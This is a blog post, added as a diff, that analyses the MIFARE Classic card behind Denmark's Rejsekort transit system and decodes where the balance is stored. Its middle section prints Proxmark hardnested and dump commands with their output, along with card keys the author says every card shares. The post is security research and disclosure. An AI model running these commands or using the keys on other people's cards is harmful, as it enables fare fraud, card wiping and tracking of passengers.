@@ -1,0 +1,347 @@
+<div class="date">19/11-2020</div>
+<h2>Rejsekortet - An obsolete smart card</h2>
+
+<p>This post attempts to analyzes the implementation of a certain type of contactless integrated circuit card used as ticketing system for public transportation in Denmark. I purchased an anonymous travel card, hoping that legally and iteratively altering data would lead me to interpret some of the stored values.</p>
+
+<p>I will begin the post introducing the proximity integrated circuit card MIFARE Classic and a briefly cover of the RFID history. Please contact me for sources.</p>
+
+<p>If theoretic requisites and history is irrelevant to you, you can skip directly to the <a class="insideurls" href="#A secret binary format">hacking part</a>. If you don't care about the introduction nor the technical details of dumping and analyzing the smart card, you can skip to the <a class="insideurls" href="#Conclusions">conclusions</a>.</p>
+
+<hr>
+
+<p><b>Approach and methodology</b><br>The majority of modernized people use smart cards, access chips or some other kind of circuit integrated tag. Most people also blindly trust these and neglect to question the security of their inner mechanisms. No matter if it is an access chip to the laundry room at an apartment complex or the access card to a countrys critical infrastructure, the quotidian user will most likely not give the security of the digital key a thought. It just works</p>
+
+<p>To stay on top of the owners provisos as well as the federal laws. I have avoided altering data on the purchased test travel card and authenticating with any of Rejsekort A/S' systems in production. The study will use only static data dumps for analysis. In order for empirical data to be as impeccable as possible, a brand new anonymous travel card is purchased. This avoids issues of data pollution that potentially could lead to misleading results. The minimum balance to apply during the purchase of the card is 100.00 DKK. The approach I believe to have the best effect is to carry out a heuristic analysis of the stored data. Gradually activity is applied to the travel card followed by a dump of content carried out foreach time. An enumeration of activities and data hopefully leads to some under-standing of its content. The balance information of the travel card is targeted, due to my assessment that this would be the most likely subject of fraudulent manipulation in real world scenarios.</p>
+
+<p><b>Test environment and tools</b><br>
+To capture the content and data stored on the travel card, a hardware tool named Proxmark 3 RDV4 is used. The Proxmark can be connected to a computer through a micro USB to USB cable and allows analyzing, modifying and breaking into smart cards and tags. The Proxmark is known as the swiss army knife of RFID security research.</p>
+
+<p><b>Origins and application</b><br> 
+Radio frequency identification (RFID) is the process of auto identifying to a reader utilizing electromagnetic fields and radio transmissions. Commonly the reader is in a fixed place while the tag is the portable unit. Readers and tags come in countless shapes and sizes and use numerous technical specifications and protocols. A tag can be passive or active. Passive tags don’t contain batteries, but are powered through the electromagnetic field emitted by the reader, allowing the tag to be as small as a grain of rice. Active tags contain a dedicated battery allowing the tag to communicate both through radio frequency and electromagnetism. Active tags also allow a greater distance of communication and use higher frequencies.</p>
+
+<p>Radio frequency identification origins in World War II. Germans noticed that their planes would reflect radar signals back to the original source when rolling the planes on approach. Allies would know that they identified themselves as friendly airplanes. Because no power source was needed in order to reflect the radar signals, it could be put as the planes being passive tags. While the Germans practiced this secret handshake, the British developed a system called identify friend or foe (IFF). IFF worked by placing a transponder on allied planes, that when picking up radar signals, would broadcast back a signal to identify themselves as friendly. This procedure needed a power source and thereby acted as an active tag.</p>
+
+<p>Smart cards have been under development since the late 1960s. While the first patent application was filed in 1968, it’s within the last 20 years that development of contactless smart cards has accelerated. Smart cards are now a widely used technology that is witnessed constantly in every day life. Credit cards, publictransportation travel cards, passports and access cards are all types of cards that have an integrated circuit implemented for contactless communication.</p>
+
+<p><b>Frequencies of RFID</b><br>When discussing RFID tags, or cards, the majority of them divide into three categories. Low frequency (LF), high frequency (HF) and ultra high frequency(UHF). While these are the most common ranges of frequencies, more exist. Some active RFID tags made for toll payment operate in frequencies up to 5.8GHz and the operating frequency for UHF usually depends on the geographical location.</p>
+
+<img class="img" width="25%" src="/images/rejsekortet-an-obsolete-smart-card/frequencies-table.png " alt="Image"/>
+
+<p><b>Superior functionality</b><br>MIFARE Classic falls under the HF category and operates at 13.56MHz. Simplified, the MIFARE Classic 4K tag consists of four parts. A 4 kilobyte electrically erasable programmable read-only memory (EEPROM), a radio frequency interface, a digital control unit and an antenna. Amongst others, the RF interface is responsible for the modulation, demodulation and voltage regulation while the digital control unit is in charge of the actual communication to and from the reader as well as storing data in the EEPROM. The antenna is in charge of powering the chip using an electromagnetic field coming from the reader andhandles the response transmission as well. Below, a proximity coupling device (PCD), also known as a contactless reader, is shown serving energy and transmitting data to a proximity integrated circuit card (PICC). The PICC is then powered through the electromagnetic field and then transmits data back to the PCD.</p>
+
+<img class="img" width="50%" src="/images/rejsekortet-an-obsolete-smart-card/picc-pcd.png " alt="Image"/>
+
+<p><b>Data storage and structure</b><br>It is vital to understand the structure of the EEPROM in order to investigate the stored data on the travel card. The memory of MIFARE Classic cards are organized in sectors and blocks. The MIFARE Classic 4K card in particular, is divided into 40 sectors. The first 32 sectors contain 4 blocks each while the last 8 sectors contain 16 blockseach, adding up to 256 blocks in total. Each sector and block can be referred to by number. For instance, sector 0 contains block 0-3, sector 1 contains block 4-7 and so on. Furthermore each block contains 16 bytes resulting in 128 bits per block.</p>
+
+<p>The 4K in the name refers to the memory capacity of the EEPROM. The absolute amount of bytes available for storage is 256 blocks of 16 bytes whichadds up to 4096 bytes. The same goes for MIFARE Classic 1K, a different type of tag from the MIFARE Classic family. 1K also refers to the 1024 bytes of memory split into 16 sectors with 4 blocks in each.</p>
+
+<p>A graphical overview of the MIFARE Classic 4K memory layout can be seen below. The last block of each sector is called the sector trailer and contains Key A, Key B as well as the access bits. The keys are used to authorize to each sector. Key A is used when reading a sector while Key B is used when writing to one. The access bits are used to define which operations are allowed to be done for the specific sector. Key A is never readable while Key B can be configured to be readable. Along with access bits, Key A and Key B, a unused byte is also present in the sector trailer. The unused byte is defined as U below.</p>
+
+<img class="img" width="60%" src="/images/rejsekortet-an-obsolete-smart-card/mifare1k-memory-layout.png " alt="Image"/>
+
+<center>A big thank you to Flavio Garcia for letting me borrow his figure from <i>A Practical Attack on the MIFARE Classic</i>. <br>The publication can be found <a class="insideurls" href="https://www.cs.bham.ac.uk/~garciaf/publications/Attack.MIFARE.pdf">here</a>.</center><br>
+
+<p><b>CRYPTO1</b><br>NXP Semiconducters, the company behind the MIFARE Classic contactless card series uses a proprietary encryption algorithm to authenticate tags with readers as well as exchanging data between them. The cipher is known as CRYPTO1. CRYPTO1 utilizes a linear feedback shift register (LFSR) during initialization and authorization. A LFSR can be described as a function that iteratively perfoms an operation using the previous iterations output as its sole input. Thus the function output is deterministic given any previous state. The original state is usually provided by the user. 
+
+<p>In 2007 a presentation by Karsten Nohl and Henryk Plötz revaled at the Chaos Community Congress in Germany revaeled a partial reverseengineering of the CRYPTO1 cipher. The paper, named <i>Reverse-Engineering a Cryptographic RFID Tag</i> was published in 2008. 
+
+<p>In 2008 a security research group from Radboud University Nijmegen in The Netherlands fully reverse engineered the CRYPTO1 cipher. NXP Semiconductors tried to stop full disclosure of the cipher by injunction. <i>A Practical Attack on the MIFARE Classic</i> was published in 2008.</p>
+
+<b>Common MIFARE Classic attacks:</b><br>
+
+<p><b>Nested</b><br>When using the nested authentication attack at least one sector key must be known. The nested attack works by first authenticating to a sector of which one of the keys is known. This is followed by a nested authentication to other sectors. While authenticating, some of the key bits can be leaked resulting in uncovering complete keys one at a time. This process can be repeated until all keys are known.</p>
+
+<p><b>Darkside</b><br>The bruteforce or darkside attack utilizes a vulnerability as a part of the CRYPTO1 initialization. The attack is used when no keys are known before hand. The attack exploits a flaw in the pseudo random number generator and error responses, which leaks partial bits of the key stream. Repeating this enough times will eventually leak all 48 bits and the key is obtained.</p>
+
+<p><b>Hardnested</b><br>In 2011, NXP Semiconductors released a new type of MIFARE Classic that had the pseudo random number generator vulnerability fixed. However in 2013 researchers found a new way of exploiting the new hardened MIFARE Classic cards. <i>A practical attack on patched MIFARE Classic</i> explains how the hardnested attack is not dependent on a weak random number generator, but exploits a flaw in the encrypted error code that returns with every authentication. A leak of four keystream bits per failed authentication is what eventually uncovers the key.</p><br>
+
+<h2 id="A secret binary format">A secret binary format</h2>
+
+<p><b>Aquiring data</b><br>As earlier in the post, a Proxmark 3 is used to acquire data dumps from the anonymous travel card. The software accompanying the Proxmark uses the command line interface and must be run with administrative rights in order to access the serial port of which the Proxmark is connected to.</p>
+
+<pre class="code">[<span class="hostubuntu">ztychr@evilcorp</span><span class="dir">~/proxmark3/client</span>]$ sudo ./proxmark3 /dev/ttyACM0</pre>
+
+<p>Once the software is running, the card is placed on the Proxmark and a HF tag is searched for.</p>
+
+<pre class="code">[usb] pm3 --> hf search
+[|] Searching for ISO14443-A tag...           
+[+]  UID : 52 7D BD 91           
+...        
+[+] TYPE : NXP MIFARE Classic 4k | Plus 4k SL1 | 4k Ev1          
+...
+[+] Prng detection: HARD           
+
+[+] Valid ISO14443-A tag found</pre>
+
+<p>Proxmark detects a ISO14443-A compatible tag. Notice that the MIFARE Classic tags are only compliant with ISO14443 part 1-3 as it uses the proprietary CRYPTO1 algorithm instead of the transmission protocol defined in part 4: <i>Contactless proximity objects — Part 4: Transmission protocol</i>. The pivotal information when attacking MIFARE Classic cards is using the original predictable or weak pseudo random number generator, or the patched version of the PRNG, here labeled 'HARD' by the Proxmark tool.</p>
+
+<p>A common mistake when provisioning MIFARE Classic cards consists of failure to change the default keys. A command <code>hf mf chk *4 ?</code> can be run to see if this is the case. <code>hf mf</code> specifies the frequency and the card type MIFARE, while <code>*</code> is specified to run the check against all sectors. <code>4</code> specifies the tag memory and <code>?</code> and is the option to run all default keys stored in the Proxmark source code.</p>
+
+<p>Unfortunately no default keys are found when running the <code>chk</code> command. A darkside attack would be fit for use to uncover just one key, proceeding to uncover the remaining keys through a nested attack. However the card is not vulnerable to either of the attack types due to it being of the hardened version. The following message returns when launching the Darkside attack.</p>
+
+<pre class="code">[-] card is not vulnerable to Dark-side attack (its random number generator is not predictable).</pre>
+
+<p>The card will still be vulnerable to the hardnested attack but as stated above, this attack requires at least one key to be known. Repeatedly trying keys from MIFARE Classic key dictionaries published online, show that one key successfully authorizes as key <code>A</code> to sector <code>0-7</code> and sector <code>39</code>. The key is <code>fc00018778f7</code>.</p>
+
+<pre class="code">[usb] pm3 --> hf mf chk *4 ? fc00018778f7
+[ 0] key FC 00 01 87 78 F7           
+...
+[=] found keys:          
+|---|----------------|---|----------------|---|          
+|sec| key A          |res| key B          |res|          
+|---|----------------|---|----------------|---|          
+|000|  fc00018778f7  | 1 |  ------------  | 0 |          
+|001|  fc00018778f7  | 1 |  ------------  | 0 |          
+|002|  fc00018778f7  | 1 |  ------------  | 0 |          
+|003|  fc00018778f7  | 1 |  ------------  | 0 |          
+|004|  fc00018778f7  | 1 |  ------------  | 0 |          
+|005|  fc00018778f7  | 1 |  ------------  | 0 |          
+|006|  fc00018778f7  | 1 |  ------------  | 0 |          
+|007|  fc00018778f7  | 1 |  ------------  | 0 |          
+...
+|039|  fc00018778f7  | 1 |  ------------  | 0 |          
+|---|----------------|---|----------------|---|          
+[=] ( 0 :Failed / 1 :Success)</pre>
+
+<p>With one key obtained, we can uncover the rest of the keys with the hardnested attack. The syntax of the attack is shown below.</p>
+
+<pre class="code">hf mf hardnested [known block][A/B] [known key] [target block][A/B]</pre>
+
+<p>To target sector <code>0</code> key <code>B</code>, the constructed command is as follows.</p>
+
+<pre class="code">hf mf hardnested 0 A fc00018778f7 0 B</pre>
+
+<pre class="code">[usb] pm3 --> hf mf hardnested 0 A fc00018778f7 0 B
+--target block no:  0, target key type:B, known target key: 0x000000000000 (not set), file action: none, Slow: No, Tests: 0          ...
+ time    | #nonces | Activity                                                | expected to brute force          
+         |         |                                                         | #states         | time           
+------------------------------------------------------------------------------------------------------          
+       0 |       0 | Start using 8 threads and AVX2 SIMD core                |                 |          
+       0 |       0 | Brute force benchmark: 986 million (2^29.9) keys/s      | 140737488355328 |    2d          
+       1 |       0 | Using 235 precalculated bitflip state tables            | 140737488355328 |    2d          
+       4 |     112 | Apply bit flip properties                               |    209830772736 |  4min
+...
+      23 |    2325 | (1. guess: Sum(a8) = 0)                                 |      1302331520 |    1s          
+      23 |    2325 | Apply Sum(a8) and all bytes bitflip properties          |      1245777280 |    1s          
+      23 |    2325 | Brute force phase completed. Key found: 00000ffe2488    |               0 |    0s       </pre>
+
+
+<p>The attack successfully retrieved Key <code>B</code> in sector <code>0</code> as <code>00000ffe2488</code>. Running the <code>chk</code> command shows that the key is reused in the same sectors as key <code>A</code>.</p>
+
+<pre class="code">[usb] pm3 --> hf mf chk *4 ? 00000ffe2488
+[ 0] key 00 00 0F FE 24 88           
+...
+[=] found keys:          
+|---|----------------|---|----------------|---|          
+|sec| key A          |res| key B          |res|          
+|---|----------------|---|----------------|---|          
+|000|  ------------  | 0 |  00000ffe2488  | 1 |          
+|001|  ------------  | 0 |  00000ffe2488  | 1 |          
+|002|  ------------  | 0 |  00000ffe2488  | 1 |          
+|003|  ------------  | 0 |  00000ffe2488  | 1 |          
+|004|  ------------  | 0 |  00000ffe2488  | 1 |          
+|005|  ------------  | 0 |  00000ffe2488  | 1 |          
+|006|  ------------  | 0 |  00000ffe2488  | 1 |          
+|007|  ------------  | 0 |  00000ffe2488  | 1 |          
+...
+|039|  ------------  | 0 |  00000ffe2488  | 1 |          
+|---|----------------|---|----------------|---|          
+[=] ( 0 :Failed / 1 :Success)          </pre>
+
+
+<p>Repeating this process is time consuming, but it will eventually uncover keys for all 40 sectors. Creating a dictionary with the exact keys can be used with the <code>d</code> parameter to create a binary keyfile which then can be used to authorize and dump contents of the card. A total amount of eight different keys were used for the entire card memory.</p>
+
+<pre class="code">[usb] pm3 --> hf mf chk *4 ? rejsekort_keys.dic d
+[+] Loaded  6 keys from rejsekort_keys.dic           
+................................................................................          
+[+] Time in checkkeys: 17 seconds
+...
+[=] found keys:          
+|---|----------------|---|----------------|---|          
+|sec| key A          |res| key B          |res|          
+|---|----------------|---|----------------|---|          
+|000|  fc00018778f7  | 1 |  00000ffe2488  | 1 |          
+...        
+|007|  fc00018778f7  | 1 |  00000ffe2488  | 1 |          
+|008|  0297927c0f77  | 1 |  ee0042f88840  | 1 |          
+...       
+|012|  0297927c0f77  | 1 |  ee0042f88840  | 1 |          
+|013|  722bfcc5375f  | 1 |  f1d83f964314  | 1 |          
+...
+|038|  722bfcc5375f  | 1 |  f1d83f964314  | 1 |          
+|039|  fc00018778f7  | 1 |  00000ffe2488  | 1 |          
+|---|----------------|---|----------------|---|          
+[=] ( 0 :Failed / 1 :Success) 
+[+] Generating binary key file          
+[+] Found keys have been dumped to hf-mf-527DBD91-key-6.bin --> 0xffffffffffff has been inserted for unknown keys. </pre>
+
+<p>The syntax of the command used to dump the contents of the card is shown below.</p>
+
+<pre class="code">hf mf dump [card memory] [k name] [f name]</pre>
+
+<p>The following constructed command is then used to dump data contents of the card.</p>
+
+<pre class="code">hf mf dump 4 k hf-mf-527DBD91-key-6.bin f travel_card</pre>
+
+<pre class="code">[usb] pm3 --> hf mf dump 4 k hf-mf-527DBD91-key-6.bin f travel_card
+[=] Reading sector access bits...          
+........................................
+[+] Finished reading sector access bits          
+[=] Dumping all blocks from card...          
+[+] successfully read block  0 of sector  0.          
+[+] successfully read block  1 of sector  0.          
+[+] successfully read block  2 of sector  0.          
+[+] successfully read block  3 of sector  0.          
+[+] successfully read block  0 of sector  1.          
+[+] successfully read block  1 of sector  1.          
+...
+[+] successfully read block 13 of sector 39.          
+[+] successfully read block 14 of sector 39.          
+[+] successfully read block 15 of sector 39.          
+[+] time: 64 seconds
+          
+[+] Succeeded in dumping all blocks
+          
+[+] saved 4096  bytes to binary file travel_card.bin           
+[+] saved 256  blocks to text file travel_card.eml           
+[+] saved to json file travel_card.json </pre>
+
+<p>We have now obtained stored data on the travel card</p>
+
+<p><b>Dismantling data</b>Resekortsföreningen i Norden (RKF) or The Travel Card Association in the North was an association located in Sweden. Major public transport organizations constituted the members. Amongst others, Danske Statsbaner (DSB) was a member. RKF used to have PDF documents of the travel card specifications available online. The website no longer exists, but an archived version can be found on <a class="insideurls" href="https://web.archive.org/web/20060615031700/http://www.resekortsforeningen.se">web.archive.org</a>.
+
+<p>The card dumps provided three file types each. A binary file which is not readable for humans, an .eml file used by the Proxmark to emulate the card and a .json file which contains information of blocks, sectors, access rights etc. The .json file also contains a copy of the binary format in hexadecimals.</p>
+
+<p>Initially the data seems confusing, unintelligible and impossible to translate into understandable information. As stated earlier the objective of the dismantlement is to locate, extract and interpret the current balance of the card. In RKFs specification document: <i>RKF Travel Card - Implementation Specification Type 1</i>, a table describes the structure of the travel card data. I recreated the table partially below.</p>
+
+<img class="img" width="50%" src="/images/rejsekortet-an-obsolete-smart-card/partial-table.png " alt="Image"/>
+
+<p>The travel card purse (TCPU) within the application layer is most likely the section containing the balance. <i>Implementation Specification Details Type 1</i> contain a list of datatypes used within the card storage as well as an overview TCPU structure. The structure is split up into static data and dynamic data. The static and dynamic structures can be seen on the screendumpbs below.</p>
+
+<img class="img" width="95%" src="/images/rejsekortet-an-obsolete-smart-card/tcpustatic.png " alt="Image"/>
+<center>Structure of TCPU static<br><i>RKF Travel Card Implementation Specification Details Type 1, 2002</i></center>
+
+<img class="img" width="95%" src="/images/rejsekortet-an-obsolete-smart-card/tcpudynamic.png " alt="Image"/>
+<center>Structure of TCPU dynamic<br><i>RKF Travel Card Implementation Specification Details Type 1, 2002</i></center>
+
+
+<p><i>RKF Travel Card - Implementation Specification Type 1</i> states that the TCPU static and TCPU dynamic data element groups each take up one block of space. We know that the size of data elements in TCPU dynamic is not listed in bytes since this would exceed the maximum possible space in one block. Recall that one block consists of 16 bytes and one byte consists of 8 bits. The sum of all data elements in each data element group is 128 which is consistent with possible bits allocated in one block. Therefore the data stored can't be byte aligned, but must be bit aligned. This means we possibly will have to convert each block of data into binary or strings in order to decode actual values.</p>
+
+Looking at the screendump of the static TCPU, we can see that the sector containing the TCPU is recognised by the identifier <code>85</code>. Looking through the data of the very first dump made shortly after the initial purchase, the card shows block <code>36</code> in sector <code>9</code> has the hexadecimal <code>85</code> as its first byte. <i>RKF Travel Card - Implementation Specification Type 1</i> states that the TCPU must be placed within sector <code>2-15</code> of the card. The header of block <code>36</code> in sector <code>9</code> consists of <code>85</code>, and presumeably is where the TCPU of the anonymous travel card is located.
+
+<pre class="code">SECTOR 9
+"36": "8506F4010000000000000000ECA10000"
+"37": "0000000000000000000E000000000000"
+"38": "02001027000156020538210000000000"
+"39": "0297927C0F7778778800EE0042F88840"</pre>
+
+<p>This being the very first dump with the card only containing the minimum amount as its balance, the amount to look for is 100.00 DKK. The balance is also confirmed by reading the travel card in a dedicated travel card top up stand as shown below.</p>
+
+<img class="img" width="75%" src="/images/rejsekortet-an-obsolete-smart-card/rejsekort_init.png " alt="Image""/>
+
+<p>While block <code>36</code> contains the static TCPU, block <code>37</code> being nearly empty and block <code>39</code> containing access bits, key <code>A</code> and key <code>B</code>, block <code>38</code>, presumably is the block containing the dynamic TCPU. The <code>16</code> bytes in block <code>38</code> translates into a <code>128</code> bit binary string.</p>
+
+<pre class="code">hexadecimal: 02 00 10 27 00 01 56 02 05 38 21 00 00 00 00 00
+binary: 00000100 00000000 00110000 01110101 00000000 00000001 10001000 10000000 
+00000100 00111010 00100001 00000000 00000000 00000000 00000000 00000000</pre>
+
+<p>According to the documentation of TCPU dynamic structure, the 24 bit sequence containing the balance information should be located in position 31-55 with the purse transaction number (16 bits) and the end date (14 bits) in front of it. The bits in position 31-55 is <code>010000000000000001100010</code>, translating to <code>4194402</code> in decimal value is no where near the value of 100.00 DKK.</p>
+
+<p>The decimal values 100, or 10000 if listed with decimals, will translate to <code>1100100</code> and <code>10011100010000</code> respectively as binary strings. The documentation is nearly 20 years old and the card contents may be configured differently now. But the binary string of sector 38 does not contain the binary sequence of the number 100 either. Why is this? Comparing sector <code>9</code> block <code>38</code> of different dumps does not seem to provide clues other than the first byte slowly incrementing.</p>
+
+<p> Sector 9 block 38 of each card dump is shown below:</p>
+
+<pre class="code">100,00 DKK : 02001027000156020538210000000000
+300,00 DKK : 0400307500018880043A210000000000
+284,00 DKK : 0600F06E00018880047A210000000000
+271,20 DKK : 0A00F06900018880047B210000000000</pre>
+
+<p>This hurdle caused a significant delay while in the phase of analysis but was eventually resolved. The hexadecimal value of <code>10000</code> is <code>2710</code> and while this isn't to be found in sector <code>38</code>, the bytes <code>27</code> and <code>10</code> can be found, only in reversed order. Flipping the bytes in pairs so that the first bytes of sector 38 is <code>00 02 27 10</code> partially fits the description of the purse transaction number and the balance of the TCPU. To ensure this wasn't a coincidence, I wrote a python script that automatically translates the bytes containing the balance when passed as an argument.</p>
+
+<pre class="code">import sys
+b38 = sys.argv[1:]
+scale = 16
+num_of_bits = 14
+arg = 0
+
+for block in sys.argv[1:]:
+
+    tra_num = block[2:4]+block[0:2]
+    balance = block[6:8]+block[4:6]
+    arg=arg+1
+    print "----------ARGUMENT", arg, "----------\n"
+    print "Transaction number: ", int(tra_num, 16)
+    print "Balance:", int(balance, 16), "DKK\n", "Hex: ", balance, "\nBin: ", 
+           bin(int(balance, scale))[2:].zfill(num_of_bits), "\n"</pre>
+
+
+<p>The script was then run on the dumps that had a balance of 100.00 DKK and 300.00 as well as dumps that had decreased the balance from 300.00 DKK to 284.00 DKK and finally 271.20 DKK. The decreased balance was reached through ordinary use of the card. Running the script with block <code>38</code> from each of the dumps as arguments returned the correct information.</p>
+
+<p>The balance history of the travel card parsed through a top up stand is shown below and is consistent with the results from the script run on each data dump.</p>
+
+<img class="img" width="75%" src="/images/rejsekortet-an-obsolete-smart-card/rk_complete.png " alt="Image"/>
+
+<pre class="code">
+[<span class="hostubuntu">ztychr@evilcorp</span><span class="dir">~/Desktop</span>]$ python rk.py 02001027000156020538210000000000 \
+ 0400307500018880043A210000000000 0600F06E00018880047A210000000000\
+ 0A00F06900018880047B210000000000
+----------ARGUMENT 1 ----------
+
+Transaction number:  2
+Balance: 10000 DKK
+Hex:  2710 
+Bin:  10011100010000 
+
+----------ARGUMENT 2 ----------
+
+Transaction number:  4
+Balance: 30000 DKK
+Hex:  7530 
+Bin:  111010100110000 
+
+----------ARGUMENT 3 ----------
+
+Transaction number:  6
+Balance: 28400 DKK
+Hex:  6EF0 
+Bin:  110111011110000 
+
+----------ARGUMENT 4 ----------
+
+Transaction number:  10
+Balance: 27120 DKK
+Hex:  69F0 
+Bin:  110100111110000</pre>
+
+<p>I can't account for the changes of the transaction number, but I believe the number " alters every time a check in and a check-out is performed, explaining why it increments by 2 for each dump as well as incrementing 4 between the last two dumps where two transports were conducted within the same hour, keeping the balance consistent.</p><br>
+
+<h2 id="Conclusions">Conclusions</h2>
+
+<p><b>Security through obscurity</b><br>
+The term ”security through obscurity” originates from the late 19th century. Dutch cryptographer Auguste Kerckhoffs, published a set of articles containing six principles on what he believed was a necessity to create a secure cryptosystem. Principle number two is as follows.</p>
+
+<p><i>”The falling of the cryptosystem into the hands of an intruder should not lead to any compromise of the system, preventing any inconve-nience to the user.”</i></p>
+
+<p>What Kerchoffs meant by this, was that a cryptosystem had to have mechanism of cryptography, that even in the hands of enemies would not be compromised. Already in 1883, the idea of not using secrecy as a security measure was created. This is what later became known as security by obscurity.</p>
+
+<p>I've dumped the contents of my personal travel card as well as a couple of my acquaintances to gather as much information as possible. After doing so I noticed the sector trailers, containing key <code>A</code> and <code>B</code> was identical between all cards. This leads to different risks of disruption and privacy. Knowing all keys and their exact affiliation with each sector reduces the time frame considerably of which a card can be dumped or be wiped of data.</p>
+
+<p>The thought of digital disruption carried out by bricking and destroying travel cards belonging to random bystanders and passengers may seem absurd at first. But considering someone with a motive to disrupt the operation of the travel card system and the organ in charge of public transportation, it could cause severe economical impact to execute such vandalism. A homemade hardware construction with the intent to wipe cards from distance; either hidden in a backpack or secretly mounted mounted on check in/top up stands, could cause severe economic impact. Not to mention the ensuing negative press coverage when uncovered that the security vulnerabilities were known since before the implementation of travel cards.</p>
+
+<p>It could be questioned whether only using eight different keys shared between all existing travel cards is responsible. This because of the last thirteen travels, including date, time, start and stop whereabouts are stored on the travel card. With enough time and A great deal of personal travel history could be gathered.</p>
+
+<p>With the right amount of willpower and stubborness, travel card data can be interpreted. Regarding the hazards of fraudulent activities, a few cases have been circulating the media throughout the years. While possible, the gains of fraudulent behavior compared with the risk of getting caught and the subsequent consequences, do not constitute a worthy tradeoff.</p>
+
+<p>Depending on the perspective, the travel card using the MIFARE Classic chip can be considered a sufficient solution. It has been in production for 10 years and so far it has shown to be a somewhat functional solution with no enormous accompanying scandals. The risk of privacy harvesting or digital vandalism could potentially be minimized, partially hindered or completely prevented by implementing rolling key codes, applying unique keys to each card or completely substituting the card type with DESFire, as was done in London in 2009. But again, the possibility of risks and the cost of carrying out such changes is to be deliberated. These changes may not be compatible or possible to unproblematically implement and it's not clear whether the fortification is worth it or actually necessary. The pros and cons must be weighed and probabilities must also be taken into account when deciding for " alteration of a well func
+tioning system in a production environment.</p>
+
+<p>In early August, I contacted Rejsekort A/S and asked them about the existing vulnerabilities in the travel card. They let me know that they have decided to migrate to DESFire cards and that they'll be conducting pilot-project with them in 2020. Exciting news. A quick Google search returned the following <a class="insideurls" href="https://www.rejsekort.dk/-/media/pdf/Handlingsplan/Ekstern-Rejsekort-Handlingsplan-20190522-tf">result</a>.</p>
+
+<img class="img" width="85%" src="/images/rejsekortet-an-obsolete-smart-card/desfire-pilot.png " alt="Image"/>
+
+<p>Apparantly, the pilot-project of implementing DESFire cards have been on the sketch board sometime in 2018 but was postponed or cancelled for unknown reasons.</p>
+
+<p>Embracing and openly discussing the subject of cyber security indicates maturity, responsibility and credibility.</p>
+<p>Secrecy is not an effective security mechanism, and certainly not when it’s the only one.</p>
+
+<p>If you made it this far, thank you for reading.</p>
